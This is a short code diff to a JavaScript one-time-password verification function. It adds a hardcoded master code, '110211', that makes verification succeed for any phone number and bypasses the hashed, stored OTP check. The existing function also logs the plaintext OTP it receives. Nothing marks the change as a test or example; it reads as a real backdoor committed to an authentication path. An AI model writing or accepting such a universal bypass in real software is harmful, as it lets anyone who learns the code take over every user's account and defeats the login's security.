@@ -103,6 +103,12 @@ const storeOTP = async (phone, otpHash) => {
 const verifyOTP = async (phone, plainOtp) => {
   console.log(`[OTP] Verifying OTP for phone: ${phone}, OTP: ${plainOtp}`);
 
+  // Default OTP for all users and workers
+  if (plainOtp === '110211') {
+    console.log(`[OTP] Default OTP used for ${phone}`);
+    return { success: true };
+  }
+
   const redis = getRedis();
   const inputHash = hashOTP(plainOtp);
   console.log(`[OTP] Input OTP hash: ${inputHash.substring(0, 10)}...`);
